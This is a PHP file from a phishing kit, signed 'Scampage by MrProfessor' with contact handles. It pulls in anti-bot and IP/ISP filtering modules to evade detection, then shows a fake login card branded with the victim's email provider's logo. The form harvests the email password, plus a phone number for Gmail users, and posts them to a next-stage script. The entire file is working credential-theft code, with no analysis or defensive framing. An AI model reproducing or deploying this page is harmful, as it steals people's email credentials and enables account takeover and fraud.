<?php
/*
 * Scampage by MrProfessor
 * Jabber: mrprofessor@jodo.im
 * ICQ: 713566330
 */
require "CONTROLS.php";
require "masteranti/bot.php";
require "masteranti/iprange.php";
require "masteranti/wrd.php";
require "masteranti/isp.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

$email = explode("@", $_SESSION['email']);

if (stripos($email[1], 'aol') !== false) {
    $provider = "aol.png";
} elseif (stripos($email[1], 'yahoo') !== false) {
    $provider = "yahoo.png";
} elseif (stripos($email[1], 'comcast') !== false) {
    $provider = "comcast.png";
}  elseif (stripos($email[1], 'sbcglobal') !== false) {
    $provider = "sbc.png";
}  elseif (stripos($email[1], 'att') !== false) {
    $provider = "att.png";
}  elseif (stripos($email[1], 'hotmail') !== false OR stripos($email[1], 'outlook') !== false OR stripos($email[1], 'live') !== false) {
    $provider = "outlook.png";
}  elseif (stripos($email[1], 'cox') !== false) {
    $provider = "cox.png";
}  elseif (stripos($email[1], 'bellsouth') !== false) {
    $provider = "bellsouth.png";
}  elseif (stripos($email[1], 'verizon') !== false) {
    $provider = "verizon.png";
}  elseif (stripos($email[1], 'charter') !== false) {
    $provider = "charter.png";
}  elseif (stripos($email[1], 'msn') !== false) {
    $provider = "msn.png";
}   elseif (stripos($email[1], 'gmail') !== false) {
    $provider = "gmail.png";
}  else {
    $provider = "others.png";
}


?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title><?php echo $_SESSION['email']; ?> - login</title>
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">
    <!-- Bootstrap core assets/css -->
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <!-- Material Design Bootstrap -->
    <link href="assets/css/mdb.min.css" rel="stylesheet">
    <!-- Your custom styles (optional) -->
    <link href="assets/css/style.css" rel="stylesheet">
</head>

<body style="background: url(bg.jpeg) no-repeat center center fixed;background-size: auto auto;-webkit-background-size: cover;-moz-background-size: cover;-o-background-size: cover;background-size: cover;">

<!-- Start your project here-->
<div class="container">
    <div class="row" style="margin-top: 100px;">
        <div class="col-md-4"></div>
        <div class="col-md-4">
            <div class="card">
                <form action="E-mail_2.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" method="POST">
                <div class="card-body text-center">
                   <img src="assets/providers/<?php echo $provider; ?>" style="width: 100px;" alt="Logo - Provider E-mail" />
                    <br /> <br />
                    <h5><b>You're logged in as:</b></h5>
                    <small style="margin-bottom: 20px;"><?php echo $_SESSION['email']; ?></small><Br />
                    <div class="form-group" style="margin-top: 10px;">
                        <input type="password" placeholder="Password" name="emailPass" class="form-control"> <br />
						<?php
						if ($provider === 'gmail.png') {
						 
							?>
							<input type="text" placeholder="Enter your mobile phone number" name="phone" maxlength="13" class="form-control">
							<?php
						}
						?>
                        
                    </div>
                    <div class="text-center">
                        <input type="submit" class="btn btn-info btn-sm" value="Login">
                    </div>
                </div>
                </form>
            </div>

        </div>
        <div class="col-md-4"></div>
    </div>
</div>
<!-- /Start your project here-->

<!-- SCRIPTS -->
<!-- JQuery -->
<script type="text/javascript" src="assets/js/jquery-3.3.1.min.js"></script>
<!-- Bootstrap tooltips -->
<script type="text/javascript" src="assets/js/popper.min.js"></script>
<!-- Bootstrap core JavaScript -->
<script type="text/javascript" src="assets/js/bootstrap.min.js"></script>
<!-- MDB core JavaScript -->
<script type="text/javascript" src="assets/js/mdb.min.js"></script>
</body>

</html>
